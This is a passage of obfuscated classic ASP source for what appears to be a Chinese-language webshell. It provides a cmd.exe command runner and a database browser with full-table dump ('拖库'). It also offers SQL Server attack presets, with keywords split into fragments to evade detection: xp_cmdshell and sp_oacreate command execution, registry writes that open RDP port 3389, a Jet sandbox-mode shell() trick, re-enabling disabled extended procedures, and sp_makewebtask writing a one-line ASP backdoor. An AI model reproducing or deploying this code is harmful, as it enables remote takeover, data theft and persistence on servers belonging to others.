meq="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&wgb
wuz.Create meq
Set jgb=khe(fxu(12))
jgb.Open meq
if err Then ixt err
jgb.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,binPath VarChar,binContent Image)")
If Err Then ixt Err
jby.Open
jby.Type=1
rs.Open"FileData",jgb,3,3
umj=Lcase(umj)
mdbName2=Replace(umj,".mdb",".ldb")
kar ucf,ucf,rs,jby
rs.Close
dqq
jby.Close
Set rs=Nothing
Set jby=Nothing
Set wuz=Nothing
If Err Then
ixt(Err)
Else
qnk"zol",qzx,"filelist":njk"oej","",0:njk"wnb","",0:sdj
tcm xhp(qyl(wgb,"\"),"target='_blank'",wgb)
End If
j lxr
End Sub
Sub dqq()
On Error Resume Next
If IsObject(jgb)Then
jgb.Close
Set jgb=Nothing
End If
End Sub
function b(str)
b="<b>"&str&"</b>"
end function
Function qyl(str,plv)
If str="" Or InStr(str,plv)<1 Then
qyl=""
Exit Function
End If
qyl=Mid(str,InstrRev(str,plv)+Len(plv))
End Function
Function ngm(str,plv,gmi)
If str="" Or InStr(str,plv)<1 Then
ngm=""
Exit Function
End If
If gmi Then
ngm=Left(str,InStr(str,plv)-1)
Else
ngm=Left(str,InstrRev(str,plv)-1)
End If
End Function
function ogs(sjy)
ogs=fri("^:if("&sjy&".rows>3)"&sjy&".rows-=3","button|25","-")&fri("^:"&sjy&".rows+=3","button|25","+")
end function
sub qnk(i,a,t)
j"<form name="""&i&""" id="""&i&""" method=""post"" action="""&a&""""
if t<>"" then j" target="""&t&""""
j" >"
end sub
sub sdj()
j"</form>"
end sub
function fri(i,t,v)
dim kry,z,r,w,y
if instr(i,"^")>0 then
y=split(i,"^")(1)
select case left(y,1)
case ":" w=" onclick"
case ";" w=" onchange"
end select
w=w&"=""javascript:"&mid(y,2)&";"""
i=split(i,"^")(0)
end if
z=split(t,"|")
if t="" then t="hidden"
if ubound(z)>0 then
t=z(0)
kry=z(1)
else
kry="100%"
end if
r="<input type="""&t&""" name="""&i&""" id="""&i&""""
if t="text" or ubound(z)>0 then r=r&" style=""width:"&kry&";"""
if trim(v)<>"0" then r=r&" value="""&v&""""
fri=r&w&">"
end function
sub njk(i,t,v)
if i="oej" then j fri(i&"1",t,v)
j fri(i,t,v)
end sub
function ury(i,t,v,k,r)
ury=fri(i,iif(t=1,"checkbox","radio")&""" "&iif(k,"checked","")&" class=""radio",v)
if r=1 then j ury
end function
Function aqw(str)
On Error Resume Next
str=CStr(str)
If IsNull(str)Or str=""Then
aqw=""
Exit Function
End If
aqw=Server.HtmlEncode(str)
End Function
Function IIf(var,fhq,tor)
If var=True Then IIf=fhq Else IIf=tor
End Function
function dwe(str)
dwe="<font color="&cl(16)&">"&str&"</font>"
end function
function yez(str)
yez="<font color=blue>"&str&"</font>"
end function
sub div(str,rye)
j"<div style='margin:"&rye&"px;'>"&str&"</div>"
end sub
sub ayd(str)
j"<h2>"&str&"</h2>"
end sub
sub ngn(str)
j"<h3 style='background-color:"&cl(0)&"'>"&qpe("t")&str&"</h3>"
end sub
function wxi(xfv)
wxi="<table width="""&xfv&"""border=""0""cellpadding=""0""cellspacing=""0"">"
end function
sub ycf(xfv):j wxi(xfv):end sub
sub vux():ycf"100%":end sub
function cmh(fbb)
dim uvu
select case fbb
case 1:uvu=cl(3)
case 0:uvu=cl(1)
case 3:uvu=cl(0)
case 2:uvu=cl(7)
end select
cmh="<tr style=""background-color:"&uvu&""""
if fbb<2 then cmh=cmh&" onmouseover=""javascript:this.style.backgroundColor='"&cl(7)&"';"" onmouseout=""javascript:this.style.backgroundColor='"&uvu&"';"""
cmh=cmh&">"
End function
function bvm(fbb)
bvm="</tr>"&cmh(fbb)
end function
sub cqb(fbb)
j cmh(fbb)
end sub
sub ihv(fbb)
j bvm(fbb)
end sub
function mnj(xfv,td)
If td=""Or IsNull(td)Then td=dwe("Null")
mnj="<td"
if right(xfv,1)="c" then
mnj=mnj&" width='"&mid(xfv,1,len(xfv)-1)&"' align='center'"
else
If isnumeric(xfv) or instr(xfv,"%")>0 Then
mnj=mnj&" width='"&xfv&"'"
else 
if xfv<>"" then mnj=mnj&" nowrap "
end if
end if
mnj=mnj&">"&CStr(td)&"</td>"
End function
sub ujq(xfv,td)
j mnj(xfv,td)
end sub
sub ity()
j"</tr></table>"
end sub
Sub cqo()
j"<tr>"
End Sub
Function iax(str,ymw)
objRe.Pattern=ymw
Set iax=objRe.Execute(str)
End Function
sub son()
On Error Resume Next
dim xss
tbr="http://"&oxs("SERVER_NAME")&":"&oxs("SERVER_PORT")&ngm(oxs("PATH_INFO"),"/",False)&"/"&mam&"?"&oxs("QUERY_STRING")
Set mke=khe(fxu(9))
Set jby=khe(fxu(7))
mke.Open"GET",tbr,False
mke.send
If wle(mke.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
xss=Trim(regReplace(iax(mke.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
ElseIf wle(mke.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
xss=Trim(regReplace(iax(mke.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
End If
if xss="" then xss="GB2312"
With jby
.Type=2
.Open
.WriteText mke.responseBody
.Position=0
.CharSet=xss
.Position=2
j .ReadText(.Size)
.close
End With
Set jby=Nothing
Response.status=mke.status
Response.end
end sub
sub xuf()
For Each lhf In request.queryString
execute pdq(lhf)&"=request.queryString("""&lhf&""")"
Next
For Each lhf In request.Form
execute pdq(lhf)&"=xqk("""&lhf&""")"
Next
end sub
Sub ixt(Err)
If Err Then
j"<hr style='color:"&cl(13)&";'/><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><li><a href='javascript:history.go(-1)'>"&dwe("返回")&"</a></li><br/><hr style='color:"&cl(13)&";'/>"
Err.Clear
Response.End
End If
End Sub
Sub tcm(str)
lxr=lxr&"<li>"&str&"</li>"
End Sub
Sub tng(afq)
j vbNewLine & "<script type=""text/javascript"">" & afq & "</script>" & vbNewLine
End Sub
Function fva()
On Error Resume Next
Dim kad
if par="" then par="/c set"
if dcu<>"" then session("dcu")=dcu
if session("dcu")="" then session("dcu")="cmd.exe"
ycf"100%"" height=""100%":cqb 3:j"<td>"
ycf"1000px"" align=""center"" height=""100%"
cqb 3
ujq 70,"CMD 路径:"
ujq 860,fri("dcu1","text",Session("dcu"))
qnk"docm",qzx,""
njk"oej","","fva"
njk"dcu","",""
njk"gia","","go"
njk"par","",""
ujq 70,ury("wse",1,1,wse=1,0)&"WScript"
sdj
ihv 3
ujq"","执行语句:"
ujq"",fri("par1","text",aqw(par))
ujq"",fri("button^:wkw('docm')","button","执 行")
If gia<>"" Then
ays
if wse="" then
kad=ffe.exec(dcu&" "&par).stdout.readall
else
dih
aok=server.mappath("cmd.txt")
ffe.Run dcu&" "&par&" > "&aok,0,True
kad=Server.HTMLEncode(ozf.OpenTextFile(aok,1,False,0).ReadAll)
ozf.DeleteFile aok,True
Set ozf=nothing
end if
set ffe=nothing
End If
ihv 3
ujq"'% height='100%'colspan='3","<textarea readonly Style='width:998;height:100%;'>"&kad&"</textarea>"
ihv 3:j"<td width='100%' colspan='3'>"
ixt(err)
ity:ity
End Function
oky=647
wfd="Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
vkq="<h3><font face=webdings>8</font> {$s}</h3><table width=100% border=0 cellpadding=0 cellspacing=0>"
zay="<select onchange=""javascript:if(this.form.vtl)this.form.vtl.value=this.value;else this.form.sql.value=this.value;""><option value=''>SQL Server常用操作列表<option value=""exec mast"&kvp&"er.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentCo"&nhz&"ntrolSet\Control\Te"&weu&"rminal Server','fDenyTSConnections','REG_DWORD',0"">打开3389端口<option value=""exec mast"&kvp&"er.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentCo"&nhz&"ntrolSet\Control\Te"&weu&"rminal Server','fDenyTSConnections','REG_DWORD',1"">关闭3389端口<option value=""EXEC [mast"&kvp&"er].[dbo].[xp_subdirs] 'c:\'"">XP_CMDShell读取目录<option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''<%ex"&"e"&"cu"&"te(re"&"qu"&"est(c"&"hr(35)))" & Chr(37) & ">''' "">sp_makewebtask写文件" & _
 "<option value=""select * from [jnc]"">查看jnc临时表内容<option value=""DROP TABLE [jnc];exec mast"&kvp&"er..xp_regwrite 'HKEY_LOCAL_MACHINE','SOF"&jjl&"TWARE\Microsoft\Jet\4.0\Engi"&dmk&"nes','Sand"&sip&"BoxMode','REG_DWORD',1;select * from openrowS"&owm&"et('microsoft.jet.oledb.4.0',';database=c:\winnt\system"&gbp&"32\ias\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');"">xp_regwrite临时数据删除<option value=""DROP TABLE [jnc];declare @o int exec sp_oacre"&nnm&"ate '"&fxu(1)&"',@o out exec sp_oa"&gzh&"method @o,'run',NULL,'cmd /c del 8617.tmp'"">sp_oacre"&nnm&"ate临时数据删除</select> "
ucf=Replace(xqk("ucf"),"\\","\")
zcu=split("xp_cmdshell,sp_oacre"&nnm&"ate,xp_regwrite",",")
ybd=split("xplog"&vuw&"70.dll,odsole70.dll,xpstar.dll,xprepl.dll",",")
kej=split("xp_cmdshell,Ole Automation Procedures,Ad Hoc Distributed Queries",",")
if cqm="" then cqm="127.0.0.1"
if aon="" then aon="1433"
if qsa="" then qsa="s"&"a"
if qsm="" then qsm="Pa"&"ssW"&"ord"
if kkw="" then kkw="systeminfo"
Sub iih()
tng"function mxq(){if(frm.sql)frm.sql.value=fvm(frm.sql.value);if(frm.vtl)frm.vtl.value=fvm(frm.vtl.value);}function cgt(cmd,str){var j=0;var strTmpB;var strTmp=str;strTmpB=frm.oej.value;if(str&&str.indexOf('*')!= -1){str=str.split('*')[0];strTmp=strTmp.split('*')[1];}if(cmd=='byf'){if(str=='0'){str=1;}else{frm.reset();}frm.dah.value=cmd;frm.param.value=str;}mxq();frm.submit();frm.target='';frm.oej.value=strTmpB;frm.reset();}function rhk(vcs){frm.reset();frm.dah.value='tk';frm.param.value=vcs;frm.target='_blank';frm.submit();frm.target='';frm.reset();}function nfe(column,str){if(!str)return;frm.reset();frm.dah.value='edit';frm.param.value=column+'!'+str;frm.target='_blank';mxq();frm.submit();frm.target='';frm.reset();}function yqb(column,str){if(!str)return;if(!confirm('确认要删除这条记录?'))return;frm.reset();frm.dah.value='del';frm.param.value=column+'!'+str;frm.target='_blank';mxq();frm.submit();frm.target='';frm.reset();}function glz(zyo){frm.ruz.value=zyo;cgt('byf','0');}function jes(ehy,bjy,sjz,scl,lyy){var iCurrPage;if(sjz <= 1){return false;}if(ehy>sjz){ehy=sjz;}iCurrPage=Math.ceil(ehy/scl);document.write(""<div align=\""left\"">&nbsp;"");document.write(""共""+bjy+""条记录, ""+sjz+""页&nbsp;"");document.write(""<a href=\""javascript:cgt('byf','1');\""><font face=\""Webdings\"">9</font></a>"");if(iCurrPage>1){document.write(""<a href=\""javascript:cgt('byf','"" + ((iCurrPage-2)*scl+1) + ""');\""><font face=\""Webdings\"">7</font></a>&nbsp;"");}else{document.write(""<font face=\""Webdings\"">7</font>&nbsp;"");}for(var i=(iCurrPage-1)*scl+1;i<=iCurrPage*scl;i++){if(i>sjz){break;}document.write(""<a href=\""javascript:cgt('byf','""+i+""');\"">"");if(i==ehy){document.write(""<strong>"" + i + ""</strong>"");}else{document.write(i);}document.write(""</a>&nbsp;"");}if(iCurrPage<Math.ceil(sjz/scl)){document.write(""<a href=\""javascript:cgt('byf','""+(iCurrPage*scl+1)+""');\""><font face=\""Webdings\"">8</font></a>"");}else{document.write(""<font face=\""Webdings\"">8</font>"");}document.write(""<a href=\""javascript:cgt('byf','""+sjz+""');\""><font face=\""Webdings\"">:</font></a>"");if(Math.ceil(sjz/scl)>=2){document.write(""&nbsp;<input id=\""page\"" value=\""""+ehy+""\"" style=\""width:24px;text-align:center;\"" /><input type=\""button\"" value=\""GO\"" onclick=\""javascript:cgt('byf',document.getElementById('page').value);\"" />"");}document.write(""&nbsp;</div>"");}"
qnk"frm",qzx,""
If dah <> "" And dah <> "byf" And dah <> "tsu" Then
tnf
sdj
Response.End
End If
kwx()
Select Case dah
Case "byf"
iii
Case "tsu"
tsu
End Select
sdj
End Sub
Sub kwx()
dim utw,zxf
utw=iif(ucf="sql:s" or ucf="","block","none")
zxf=iif(utw="block","none","block")
njk"oej","","iih"
njk"dah","",""
njk"param","",""
j Replace(vkq,"{$s}","Access + SQL Server 数据库操作")
j"<td height=50 align=center>"
ycf"700"
cqb 0
j"<td width=90><select onchange=""javascript:if(this.value=='sql:s'){s0.style.display='block';s1.style.display='none';}else{s0.style.display='none';s1.style.display='block';}this.form.ucf.value=this.value;""><option value='sql:s'>SQL Server<option value='DataSource;res;PassWord;'>MDB<option value='sql:Dsn=DsnName;'>数据源"
if ucf="" then ucf="sql:s"
j"</select></td><td id='s1' width='550' style='display:"&zxf&";'>"
njk"ucf","text",aqw(ucf)
j"</td><td id='s0' width='550' style='display:"&utw&";'>Ip:"
njk"cqm","text|95",aqw(cqm):j" Port:"
njk"aon","text|40",aqw(aon):j" Uid:"
njk"qsa","text|80",aqw(qsa):j" Pwd:"
njk"qsm","text|80",aqw(qsm):j" DataBase:"
njk"cwb","text|70",aqw(cwb)
j"</td>"
ujq"c",fri("Submit^:this.form.dah.value='tsu'","submit","提 交")
ity:j"</td>"
ity
End Sub
Sub tsu()
Dim ztk,aoz,gft,tud,uwq
On Error Resume Next
ype
Set Cat=khe(fxu(13))
Cat.ActiveConnection=jgb.ConnectionString
vux
if flh then yqn:oky=474
ihv 3
ujq"","SQL 语句："
ujq"",zay&"<textarea id=sql name=sql rows=1 style='width:"&oky&"px;'></textarea> <input type=""button"" value=""查 询"" onclick=""javascript:this.form.dah.value='iii';cgt('byf','0');"">"&ogs("sql")
ity
j Replace(vkq,"{$s}","数据表及结构查看")
cqb 2:j"<td width='20%' valign=top>"
vux
gft=IIf(flh=True,"4","6")
Set Rs=jgb.OpenSchema(20)
cqb 3:ujq"",b("库: "&rs(0))
rs.movefirst
do while not rs.eof
if rs(3)="TABLE" then
ihv 0:ujq"","<span class=fixSpan title='"&rs(2)&"' onclick=""javascript:cgt('byf',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>表: "&rs(2)&"</span>"
uwq=uwq&"<table width=100% align=center>"&cmh(3)&mnj("'% colspan='"&gft,"&nbsp;"&b(Rs(2))&" <a href=""javascript:rhk('"&Rs(2)&"');"">"&dwe("拖库")&"</a>")&cmh(3)&mnj("","&nbsp;列名")&mnj("100c","类型")&mnj("90c","大小")&mnj("90c","可否为空")
If flh=False Then
uwq=uwq&mnj("60c","默认值")
uwq=uwq&mnj("400c","描述")
End If
Set rs1=jgb.execute("select * from "&rs(2))
usk=rs(2)
for each aoz in rs1.fields
uwq=uwq&bvm(4)&mnj("m","&nbsp;"&aoz.Name&mnj("m",tnr(aoz.Type)))
If aoz.DefinedSize <> 0 Then
uwq=uwq&mnj("c",aoz.DefinedSize)
 Else
uwq=uwq&mnj("c",IIf(aoz.Precision <> 0,aoz.Precision,"&nbsp;"))
End If
uwq=uwq&mnj("c",IIf(aoz.Attributes=1,"False","True"))
If flh=False Then
uwq=uwq&mnj("c","<span class=fixSpan style='width:40px;padding-left:5px;' title=""" & aqw(cat.Tables(usk).Columns(aoz.Name).Properties("Default").value) & """>"& aqw(cat.Tables(usk).Columns(aoz.Name).Properties("Default").value)&"</span>")
uwq=uwq&mnj("","<span class=fixSpan style='width:95px;padding-left:5px;' title=""" & aqw(cat.Tables(usk).Columns(aoz.Name).Properties("Description")) & """>"&aqw(cat.Tables(usk).Columns(aoz.Name).Properties("Description"))&"</span>")
End If
next
end if
rs.movenext
loop
ity
j"</td><td>"
j uwq
j"</td>":ity
Set rs1=Nothing
Set rs=Nothing
dqq
End Sub
Sub iii()
Dim i,p,x,rs,sql,vtl,sqlC,Cat,wkh,ztk,btq,scm,rny,pqm
On Error Resume Next
sql=xqk("sql")
btq=xqk("param")
scm=xqk("theTable")
Set rs=khe(fxu(15))
If IsNumeric(btq)=True Then
wkh=btq
 Else
wkh=1
scm=btq
sql=""
End If
If sql="" Then
sql="Select * From [" & scm & "]"
End If
For i=1 To request("KeyWord").Count
If request("KeyWord")(i) <> "" Then
sqlC=Replace(request("KeyWord")(i),"'","''")
sqlC=IIf(request("JoinTag")(i)=" like ","'" & sqlC & "'",sqlC)
vtl=vtl & "[" & request("Fields")(i) & "]" & request("JoinTag")(i) & sqlC & request("JoinTag2")(i)
End If
Next
If vtl <> "" Then
sql="Select * From [" & scm & "] Where " & vtl
If Right(sql,4)=" Or " Then sql=Left(sql,Len(sql) - 4)
If Right(sql,5)=" And " Then sql=Left(sql,Len(sql) - 5)
End If
if ruz<>"" then sql=""
ype
vux
if flh then yqn:oky=474
ihv 3
ujq"","SQL 语句："
ujq"",zay&fri("sql","",aqw(sql))&"<textarea name=vtl id=vtl rows=1 style='width:"&oky&"px;'>" & aqw(sql) & "</textarea> "&fri("^:this.form.ugw.value='';this.form.sql.value=this.form.vtl.value;cgt('byf','0')","button","查 询")&ogs("vtl")&fri("theTable","",aqw(scm))
ity
If LCase(Left(sql,7))="select " and ruz="" Then
j Replace(vkq,"{$s}","数据查询器")
Set Rs1=jgb.OpenSchema(20)
cqb 2:j"<td width='20%' valign=top>"
vux
rs1.movefirst
do while not rs1.eof
if rs1(3)="TABLE" then 
If rs1(2)=scm  Then
ihv 2
Else
ihv 0
End If
ujq"","<span class=fixSpan title='" & rs1(2) & "' onclick=""javascript:cgt('byf',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>"&rs1(2)&"</span>"
end if
rs1.movenext
loop
set rs1=nothing
ity
j"</td><td valign=top>"
rs.Open sql,jgb,1,1
ixt(Err)
rs.PageSize=20
If Not rs.Eof Then
rs.AbsolutePage=wkh
End If
j"<div align=left>"
vux
cqb 3
ujq"","&nbsp;查询"
j"</tr><tr><td align=center>"
j"<div><br><select name=Fields>"
For Each x In rs.Fields
j"<option value=""" & x.Name & """>" & x.Name & "</option>"
Next
j"</select>"
j"<select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select>"
njk"KeyWord","text|200",""
j"<select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> "
njk"^:this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>'","button","+"
njk"^:this.parentElement.outerHTML=''","button","-":j"</div>"
njk"^:this.form.sql.value='';this.form.param.value='1';this.form.dah.value='byf';this.form.submit()","button","查询"
j"<br><br></div>":ity
If rs.Fields.Count > 0 Then
rny=ymv(scm)
j"<table width='99%'>"
ihv 3
ujq"100' height='22c","操作"
For p=0 To rs.Fields.Count - 1
ujq 1/rs.Fields.Count*100&"%","<span class=fixSpan title='" & rs.Fields(p).Name & "' style='width:125px;padding-left:5px;'>" & rs.Fields(p).Name & "</span>"
Next
For i=1 To rs.PageSize
If rs.Eof Then Exit For
ihv 1
j"<td width=100 height=22 align=center>"
If rny <> "" Then
njk"^:nfe('" & rny & "','" & rs(rny) & "')","button","编辑"
njk"^:yqb('" & rny & "','" & rs(rny) & "')","button","删除"
 Else
njk"^:alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');nfe('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","编辑"
njk"^:alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');yqb('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","删除"
End If
For p=0 To rs.Fields.Count - 1
ujq"","<span class=fixSpan style='width:125px;padding-left:5px;'>" & aqw(IIf(Len(rs(p)) > 50,Left(rs(p),50),rs(p))) & "</span>"
Next
rs.MoveNext
Next
End If
ihv 3
tng"jes(" & wkh & ",'" & rs.RecordCount & "','" & rs.PageCount & "',10,'');"
ity
rs.Close
 else
 if xqk("ugw")<>"" and ruz="ruz" then
select case ugw
case 0
sql="Exec mast"&kvp&"er.dbo.XP_CMDShell '"&kkw&"'"
case 1
jgb.Execute("create table [jnc](resulttxt nvarchar(1024) null);use mast"&kvp&"er declare @o int exec sp_oacre"&nnm&"ate 'WScri"&jjx&"pt.Sh"&tmj&"ell',@o out exec sp_oa"&gzh&"method @o,'run',null,'cmd /c "&kkw&" > 8617.tmp',0,true;bulk insert [jnc] from '8617.tmp' with (keepnulls);")
sql="select * from jnc"
txk="drop table [jnc];declare @o int exec sp_oacre"&nnm&"ate 'WScri"&jjx&"pt.Sh"&tmj&"ell',@o out exec sp_oa"&gzh&"method @o,'run',null,'cmd /c del 8617.tmp'"
case 2
path="c:\windows\system"&gbp&"32\ias\ias.mdb"
jgb.Execute("create table [jnc](resulttxt nvarchar(1024) null);exec mast"&kvp&"er..xp_regwrite 'hkey_local_machine','SOF"&jjl&"TWARE\microsoft\jet\4.0\Engi"&dmk&"nes','Sand"&sip&"BoxMode','reg_dword',0;select * from openrowS"&owm&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c "&kkw&" > 8617.tmp"&chr(34)&")');")
jgb.execute("select * from openrowS"&owm&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');bulk insert [jnc] from 'jnc.tmp' with (keepnulls);")
sql="select * from jnc"
txk="drop table [jnc];exec mast"&kvp&"er..xp_regwrite 'hkey_local_machine','SOF"&jjl&"TWARE\microsoft\jet\4.0\Engi"&dmk&"nes','Sand"&sip&"BoxMode','reg_dword',1;select * from openrowS"&owm&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
case ""
exit sub
case else
end select
end if
ixt(Err)
vux
cqb 3
ujq"","执行结果：":j"</tr>"
if ruz="uzk" or ruz="dko" then
i=0
if ruz="dko" then jgb.Execute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Web Assistant Procedures', 1;RECONFIGURE;")
for each x in zcu
if ruz="dko" then jgb.Execute("dbcc ad"&tfj&"dextEndedproc ('"&x&"','"&ybd(i)&"');EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure '"&kej(i)&"', 1;RECONFIGURE;")
Set rs=jgb.Execute("select count(*) from mast"&kvp&"er.dbo.sysobjects where xtype='x' and name='"&x&"'")
pqm=pqm&bvm(1)&mnj("",iif(ruz="dko","恢复......","")&x&"......"&iif(rs(0)<>"",pzk,vrc))
set rs=nothing
i=i+1
next
else
Set rs=jgb.Execute(sql,i,&H0001)
ixt(Err)
If rs.Fields.Count > 0 Then
cqb 4
For i=0 To rs.Fields.Count - 1
ujq"",rs.Fields(i).Name
pqm=pqm &mnj("","{$" & i & "}")
Next
pqm=pqm & "</tr>"
j"</tr>"
Do Until rs.EOF
For i=0 To rs.Fields.Count - 1
pqm=Replace(pqm,"{$" & i & "}",emb(rs(i)) & "<br />{$" & i & "}")
Next
rs.MoveNext
Loop
For i=0 To rs.Fields.Count - 1
pqm=Replace(pqm,"<br />{$" & i & "}","")
Next
Else
pqm=mnj("","查询执行成功")
End If
end if
j pqm 
ity
jgb.execute(txk)
Set rs=Nothing
Set Cat=Nothing
dqq
Exit Sub
End If
j"</td>":ity
Set rs=Nothing
Set Cat=Nothing
dqq
End Sub
sub rhk()
On Error Resume Next
vkr=param&"_bak.txt"
ype:dih
Set rs=khe(fxu(15))
rs.open "select * from "&param,jgb,1,1
set f=ozf.createtextfile(server.mappath(vkr),8,true)
ywb=rs.RecordCount
for i=0 to rs.Fields.Count-1
f.write rs(i).name & "###"
next
f.write br
while not rs.eof
for i=1 to rs.Fields.Count
f.write rs(i-1) & "###"
next
f.write br
rs.movenext
j"."
zko
wend
j"<center>拖库完成！字段分隔符为：###<br>"&xhp(vkr,"",server.mappath(vkr))&"</center>"
f.close
rs.close
set rs=nothing
set f=nothing
set ozf=nothing
dqq
end sub
Sub tnf()
On Error Resume Next
Dim scz,fiy,ele,rgm,gge,ozs,aef,ofi
Dim i,x,rs,sql,scm,ldc,btq,koy,thc,sjx,rny
if dah="tk" then
rhk
Response.End
end if
sql=xqk("sql")
btq=xqk("param")
scm=xqk("theTable")
koy=InStr(btq,"!")
scz=InStr(LCase(sql)," where")
fiy=InStrRev(LCase(sql),"order ")
ele=IIf(LCase(Right(sql,4))="desc","1","0")
sjx=Mid(btq,koy + 1)
thc=Left(btq,koy - 1)
ldc=IIf(dah="next",">",IIf(dah="pre","<",""))
If fiy > 0 Then sql=Left(sql,fiy - 1)
If scz > 0 Then
ozs=") And "
sql=Left(sql,scz + 5) & "(" & Mid(sql,scz + 6)
 Else
ozs=" Where "
End If
If ele > 0 Then ldc=IIf(ldc=">","<",IIf(ldc="<",">",""))
ype
rny=ymv(scm)
Set rs=khe(fxu(15))
If ldc <> "" And IsNumeric(sjx)=True Then
sql="Select Top 1" & Mid(sql,7) & ozs
sql=sql & thc & " " & ldc & " " & sjx & " Order By " & thc & IIf(ldc="<"," Desc"," Asc")
 Else
sql=sql & ozs & thc & " like '" & Replace(sjx,"'","''") & "'"
End If
gge=InStr(LCase(sql),"from")
scz=InStr(LCase(sql)," where")
rgm=InStr(gge,LCase(sql),",",1)
If rgm > 0 Then
If (rgm > gge) And (rgm < scz) Then
aef=True
End If
End If
If dah <> "edit" Then
rs.Open sql,jgb,1,3
ixt(Err)
If rs.Eof Then
tng"alert('该记录不存在!');history.back();"
Response.End()
End If
If dah="new" Then rs.AddNew
If dah="del" Then
rs.Delete
rs.Update
yey("删除成功!")
Response.End
 Else
If dah <> "pre" And dah <> "next" Then
For Each x In rs.Fields
If rny <> x.Name Then
rs(x.Name)=xqk(x.Name & "_Column")
End If
Next
rs.Update
End If
sjx=rs(thc)
End If
If dah="new" Then
sql="Select * From [" & scm & "] Where " & thc & " like '" & Replace(sjx,"'","''") & "'"
End If
rs.Close
End If
rs.Open sql,jgb,1,1
j"<table width=600 align=center>"
cqb 4
ngn"数据编辑"
njk"oej","","iih"
njk"dah","","save"
njk"sql","",aqw(xqk("sql"))
njk"theTable","",scm
njk"param","",aqw(thc & "!" & sjx)
njk"ucf","",aqw(xqk("ucf"))
For Each x In rs.Fields
ihv 4
j"<td height=22 width=150>&nbsp;" & aqw(x.Name) & "<br/>&nbsp;(<em>" & tnr(x.Type) & "</em>)"
j"</td>"
j"<td width=450>&nbsp;"
j"<textarea style='width:436;' name=""" & x.Name & "_Column""" & IIf(x.Type=201 Or x.Type=203," rows=6","")
j IIf(x.Properties("ISAUTOINCREMENT").Value," disabled","") 
j IIf(x.Name=rny," title='主键,由于主键约束,将无法被修改,也不能出现相同值.'","") & ">"
j aqw(x.value)
j"</textarea></td></tr>"
Next
j"<tr>"
j"<td colspan=2 class=td align=center>"
If aef=False Then
If rny="" Then
njk"^:if(confirm('确定要修改这条记录吗?\n此表没有主键,继续操作可能会导致数据库灾难,并且该错误无法被撤消.')){this.form.dah.value='save';this.form.submit();}","button","修改"
 Else
njk"^:this.form.dah.value='save'","submit","修改"
njk"^:if(confirm('确实要添加当前为新记录吗?')){this.form.dah.value='new';this.form.submit();}","button","添加"
njk"^:if(confirm('确实删除当前记录吗?')){this.form.dah.value='del';this.form.submit();}","button","删除"
End If
End If
njk"","reset","重置"
njk"^:window.close()","button","关闭"
j"<input type=reset value=重置><input type=button value=关闭 onclick='javascript:window.close();'>"
If IsNumeric(sjx)=True Then
njk"^:this.form.dah.value='pre';this.form.submit()","button","上一条"
njk"^:this.form.dah.value='next';this.form.submit()","button","下一条"
End If
j"</td>"
j"</tr>"
j"</table>"
rs.Close
Set rs=Nothing
dqq
End Sub
sub yqn()
set rs=jgb.execute("select is_srvrolemember('sysadmin')")
if rs(0)=0 then ogp="不"
set rs=nothing
njk"ruz","",""
cqb 3
ujq 60,"组件操作：":j"<td>"
njk"dko^:glz('dko')","button","恢复组件":j" "&dwe("此账号"&ogp&"是最高权限,SQL Server 2005 组件默认为禁用，请点击恢复组件后再执行相关命令")&"</td>"
ihv 3
ujq"","CMD 命令：":j"<td>"
j"<select name='ugw' id='ugw'><option value=''>选择执行组件"
for i=0 to 2
j"<option value='"&i&"'"
if trim(i)=ugw then j" selected='selected'"
j">"&zcu(i)&"</option>"
next
j"</select> "
njk"kkw","text"" size=""102",aqw(kkw):j" "
njk"^:glz('ruz')","button","执 行":j"</td>"
end sub
Sub ype()
Dim meq,mvu,res,gfu,wqi
On Error Resume Next
Set jgb=khe(fxu(12))
if ucf="sql:s" then
ucf="sql:Driver={Sql Server};Server={$cqm};Database={$cwb};Uid={$qsa};Pwd={$qsm}"
if IsNumeric(aon) then aon=","&aon else aon=",1433"
ucf=Replace(ucf,"{$cqm}",cqm&aon)
ucf=Replace(ucf,"{$qsa}",qsa)
ucf=Replace(ucf,"{$qsm}",qsm)
ucf=Replace(ucf,"{$cwb}",cwb)
end if
If LCase(Left(ucf,4))="sql:" Then
meq=Mid(ucf,5)
flh=True
 Else
mvu=Split(ucf,";")
wqi=mvu(0)
wqi=wqi
ixt(Err)
If UBound(mvu) >=2 Then
res=mvu(1)
gfu=mvu(2)
End If
meq=Replace(wfd,"{$dbSource}",wqi)
meq=Replace(meq,"{$userId}",res)
meq=Replace(meq,"{$passWord}",gfu)
end if
jgb.Open meq
ixt(Err)
End Sub
